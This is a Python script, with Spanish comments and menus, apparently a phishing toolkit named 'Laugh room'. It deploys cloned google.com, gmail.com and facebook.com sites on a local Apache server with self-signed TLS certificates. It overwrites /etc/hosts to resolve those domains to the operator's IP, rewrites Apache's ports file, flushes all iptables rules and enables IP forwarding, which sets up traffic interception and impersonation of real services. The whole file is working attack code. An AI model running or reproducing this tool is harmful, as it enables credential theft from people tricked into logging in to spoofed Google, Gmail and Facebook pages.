import os 
import time
import sys
import threading
import shutil

from subprocess import Popen, PIPE, STDOUT
from netdiscover import *

import pandas as pd
from io import open

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  variables  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

listamenu=["Menu de Opciones:", "1--Desplegar webs ", "2--Ip y ctr ", "3--star server", "4--stop server", "5--Exit"]#Menu Princcipal
exit=False
key=0

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Funciones menu $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

def menu():

  print("\033[1;31;1m ")
  os.system('figlet Laugh room')
  print("\033[1;37;1m ")
  print("            "+listamenu[0])
  print("\033[1;37;m ")
  print("            "+listamenu[1])
  print("            "+listamenu[2])
  print("            "+listamenu[3])
  print("            "+listamenu[4])
  print("            "+listamenu[5])
 
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Funcion Nombre web $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

def Nombweb():

  global N_web_g
  global N_web_gm
  global N_web_fb
  
  while True:
    try:
      N_web_g=(str("google.com"))      
      N_web_gm=(str("gmail.com"))
      N_web_fb=(str("facebook.com"))
     
      print("creando directorio ")
      os.system('mkdir -p /var/www/'+N_web_g+'/public_html')# 
      os.system('mkdir -p /var/www/'+N_web_gm+'/public_html')
      os.system('mkdir -p /var/www/'+N_web_fb+'/public_html')
      print("copiando archivos necesarios")
      os.system('tar -xzvf /root/virtualserver/web/google/google.com.tar.gz --directory /var/www/google.com/public_html')
      os.system('tar -xzvf /root/virtualserver/web/google/Gmail/Gmail.tar.gz --directory /var/www/gmail.com/public_html')
      os.system('tar -xzvf /root/virtualserver/web/facebook/facebook.tar.gz --directory /var/www/facebook.com/public_html')
      print("concediendo permisos de usuario")
      os.system('chown -R $USER:$USER /var/www/'+N_web_g+'/public_html')# 
      os.system('chown -R $USER:$USER /var/www/'+N_web_gm+'/public_html')
      os.system('chown -R $USER:$USER /var/www/'+N_web_fb+'/public_html')            
      os.system('chmod -R 755 /var/www')#
      
      return N_web_g, N_web_gm, N_web_fb  

    except TypeError:
      print("error ")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Funciones operativa $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

def confweb(N_web_g, N_web_gm, N_web_fb):

  global ip_pc
  
  while True:

    try:

      ip_pc=input(str("introduzca la ip de su equipo : "))
      print(str(ip_pc))

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Archivo COnf google
      line1g='<VirtualHost '+ip_pc+':443>'
      line2g="    SSLEngine on"
      line3g='    SSLCertificateFile /etc/apache2/ssl/'+N_web_g+'.pem'
      line4g='    SSLCertificateKeyFile /etc/apache2/ssl/'+N_web_g+'.key'
      line5g=""
      line6g='    ServerAdmin admin@'
      line7g='    ServerName '
      line8g='    ServerAlias www.'
      line9g='    DocumentRoot /var/www/'+N_web_g+'/public_html'
      line10g="   ErrorLog ${APACHE_LOG_DIR}/error.log"
      line11g="   CustomLog ${APACHE_LOG_DIR}/access.log combined"
      line12g="</VirtualHost>"
      ruta_conf_g=(str('/etc/apache2/sites-available/'+N_web_g+'.conf'))
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Archivo COnf Gmail
      line1gm='<VirtualHost '+ip_pc+':443>'
      line2gm="    SSLEngine on"
      line3gm='    SSLCertificateFile /etc/apache2/ssl/'+N_web_gm+'.pem'
      line4gm='    SSLCertificateKeyFile /etc/apache2/ssl/'+N_web_gm+'.key'
      line5gm=""
      line6gm='    ServerAdmin admin@'
      line7gm='    ServerName '
      line8gm='    ServerAlias www.'
      line9gm='    DocumentRoot /var/www/'+N_web_gm+'/public_html'
      line10gm="   ErrorLog ${APACHE_LOG_DIR}/error.log"
      line11gm="   CustomLog ${APACHE_LOG_DIR}/access.log combined"
      line12gm="</VirtualHost>"
      ruta_conf_gm=(str('/etc/apache2/sites-available/'+N_web_gm+'.conf'))
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Archivo COnf facebook
      line1fb='<VirtualHost '+ip_pc+':443>'
      line2fb="    SSLEngine on"
      line3fb='    SSLCertificateFile /etc/apache2/ssl/'+N_web_fb+'.pem'
      line4fb='    SSLCertificateKeyFile /etc/apache2/ssl/'+N_web_fb+'.key'
      line5fb=""
      line6fb='    ServerAdmin admin@'
      line7fb='    ServerName '
      line8fb='    ServerAlias www.'
      line9fb='    DocumentRoot /var/www/'+N_web_fb+'/public_html'
      line10fb="   ErrorLog ${APACHE_LOG_DIR}/error.log"
      line11fb="   CustomLog ${APACHE_LOG_DIR}/access.log combined"
      line12fb="</VirtualHost>"
      ruta_conf_fb=(str('/etc/apache2/sites-available/'+N_web_fb+'.conf'))
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Archivo hosts      
      line1="127.0.0.1 localhost"
      line2=ip_pc+'    '+N_web_g
      line3=ip_pc+'    '+'www.'+N_web_g
      line4=ip_pc+'    '+'http://www.'+N_web_g
      line5=ip_pc+'    '+'https://www.'+N_web_g
      line6=ip_pc+'    '+N_web_gm
      line7=ip_pc+'    '+'www.'+N_web_gm
      line8=ip_pc+'    '+'http://www.'+N_web_gm
      line9=ip_pc+'    '+'https://www.'+N_web_gm
      line10=ip_pc+'    '+N_web_fb
      line11=ip_pc+'    '+'www.'+N_web_fb
      line12=ip_pc+'    '+'http://www.'+N_web_fb
      line13=ip_pc+'    '+'https://www.'+N_web_fb
      ruta_host=(str('/etc/hosts'))
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Archivo Port
      line14="# /etc/apache2/sites-enabled/000-default.conf"
      line15="#NameVirtualHost *:443"
      line16=""
      line17="Listen 443"
      ruta_ports=(str('/etc/apache2/ports.conf'))
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
      
      pase=input(str("tiene ya certificado? : ")) #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ certificado
  
      if(pase=="N"):

        print("Creando carpeta y certificado")
        os.system('mkdir /etc/apache2/ssl')         
        os.system('openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/apache2/ssl/'+N_web_g+'.pem -keyout /etc/apache2/ssl/'+N_web_g+'.key')
        os.system('openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/apache2/ssl/'+N_web_gm+'.pem -keyout /etc/apache2/ssl/'+N_web_gm+'.key')
        os.system('openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/apache2/ssl/'+N_web_fb+'.pem -keyout /etc/apache2/ssl/'+N_web_fb+'.key') 
        os.system('chmod -R 600 /etc/apache2/ssl')
        os.system('systemctl restart apache2')
        print("certificado creado")

      else:

        print("Certificado banjo su responsabilidad")
        #os.system('openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/apache2/ssl/'+N_web_g+'.pem -keyout /etc/apache2/ssl/'+N_web_g+'.key')
        #os.system('openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/apache2/ssl/'+N_web_gm+'.pem -keyout /etc/apache2/ssl/'+N_web_gm+'.key')
        #os.system('openssl req -x509 -nodes -days 1095 -newkey rsa:2048 -out /etc/apache2/ssl/'+N_web_fb+'.pem -keyout /etc/apache2/ssl/'+N_web_fb+'.key')        
        #os.system('chmod -R 600 /etc/apache2/ssl')
        os.system('systemctl restart apache2')
        print("certificado creado")
                                            #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ fin certificado

                                            #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Archivo Conf
      print("Creado archivo conf")
      archivo_conf=open(ruta_conf_g,"a")
      archivo_conf.write(line1g+'\n')
      archivo_conf.write(line2g+'\n')
      archivo_conf.write(line3g+'\n')
      archivo_conf.write(line4g+'\n')
      archivo_conf.write(line5g+'\n')
      archivo_conf.write(line6g+N_web_g+'\n')
      archivo_conf.write(line7g+N_web_g+'\n')
      archivo_conf.write(line8g+N_web_g+'\n')
      archivo_conf.write(line9g+'\n')
      archivo_conf.write(line10g+'\n')
      archivo_conf.write(line11g+'\n')
      archivo_conf.write(line12g+'\n')
      archivo_conf.close()
      archivo_conf=open(ruta_conf_gm,"a")
      archivo_conf.write(line1gm+'\n')
      archivo_conf.write(line2gm+'\n')
      archivo_conf.write(line3gm+'\n')
      archivo_conf.write(line4gm+'\n')
      archivo_conf.write(line5gm+'\n')
      archivo_conf.write(line6gm+N_web_gm+'\n')
      archivo_conf.write(line7gm+N_web_gm+'\n')
      archivo_conf.write(line8gm+N_web_gm+'\n')
      archivo_conf.write(line9gm+'\n')
      archivo_conf.write(line10gm+'\n')
      archivo_conf.write(line11gm+'\n')
      archivo_conf.write(line12gm+'\n')
      archivo_conf.close()
      archivo_conf=open(ruta_conf_fb,"a")
      archivo_conf.write(line1fb+'\n')
      archivo_conf.write(line2fb+'\n')
      archivo_conf.write(line3fb+'\n')
      archivo_conf.write(line4fb+'\n')
      archivo_conf.write(line5fb+'\n')
      archivo_conf.write(line6fb+N_web_fb+'\n')
      archivo_conf.write(line7fb+N_web_fb+'\n')
      archivo_conf.write(line8fb+N_web_fb+'\n')
      archivo_conf.write(line9fb+'\n')
      archivo_conf.write(line10fb+'\n')
      archivo_conf.write(line11fb+'\n')
      archivo_conf.write(line12fb+'\n')
      archivo_conf.close()

      print("Archivo Conf creado")              #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ fin Conf
      print("")
      print("Modificando archivo hosts")        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Archivo hosts
      
      os.system('unlink '+ruta_host)
      archivo_hosts=open(ruta_host,"a")
      archivo_hosts.write(line1+'\n')
      archivo_hosts.write(line2+'\n')
      archivo_hosts.write(line3+'\n')
      archivo_hosts.write(line4+'\n')
      archivo_hosts.write(line5+'\n')      
      archivo_hosts.write(line6+'\n')
      archivo_hosts.write(line7+'\n')
      archivo_hosts.write(line8+'\n')
      archivo_hosts.write(line9+'\n')
      archivo_hosts.write(line10+'\n')
      archivo_hosts.write(line11+'\n')
      archivo_hosts.write(line12+'\n')
      archivo_hosts.write(line13+'\n')            
      archivo_hosts.close()
 
      print("Archivo Hosts creado")             #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ fin hosts
      print("")
      print("Modificando archivo ports")        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Archivo ports

      os.system('unlink '+ruta_ports)
      archivo_ports=open(ruta_ports,"a")
      archivo_ports.write(line14+'\n')
      archivo_ports.write(line15+'\n')
      archivo_ports.write(line16+'\n')
      archivo_ports.write(line17+'\n')
      archivo_ports.close()

      print("Configurado arcchivo ports")                #$$$$$$$$$$$$$$$$$$$$$$$$$$ fin ports
      print("")
      print("Activando modulo Ssl Apache2")

      os.system('cd /etc/apache2/mods-available | a2enmod ssl') #$$$$$$$$$$$$$$$$$$$$$$$$$$ Activa modulo ssl apache2
      os.system('a2ensite '+N_web_g+'.conf')
      os.system('a2ensite '+N_web_gm+'.conf')
      os.system('a2ensite '+N_web_fb+'.conf')
      os.system('systemctl reload apache2')
      os.system('service apache2 reload')
      print("Moduloo  Activado")

      break

    except TypeError:
      print("error TrAkA PeTo ;) int_d_nv ")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ funciones de activacion $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  
def actserver():

  os.system('systemctl start apache2')# 
  os.system('service apache2 start')# 
  os.system('apache2ctl -t')# 
 


def offserver():

  os.system('systemctl stop apache2')# 
  os.system('service apache2 stop')# 

def iptable():
  
  print("configurando iptables") 
  os.system('echo "1" > /proc/sys/net/ipv4/ip_forward')
  os.system('iptables -F')
  os.system('iptables -X')
  os.system('iptables -Z')
  os.system('iptables -t nat -F')
  os.system('iptables -P FORWARD ACCEPT') 
  os.system('iptables -A INPUT -p tcp -m tcp --dport 443 -j ACCEPT')
  os.system('iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT')
  os.system('iptables -A INPUT -p tcp -m tcp --dport 8080 -j ACCEPT')
  os.system('iptables-save > /etc/iptables.up.rules')

  print("configuracion iptables terminada")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ loop program $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

while exit==False:
  
  menu()
  key=(int(input("            "+"Select: ")))
  
  if (key==1):

    Nombweb()
    iptable()

  elif (key==2):
    confweb(N_web_g, N_web_gm, N_web_fb)
  
  elif (key==3):

    actserver()

  elif (key==4):
    offserver()

  elif (key==5):
    exit=True
  
print("\033[1;31;1m ")  
print("Smp_A byTe_Dey_bYte_HackiNg")
print("\033[1;31;m ")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$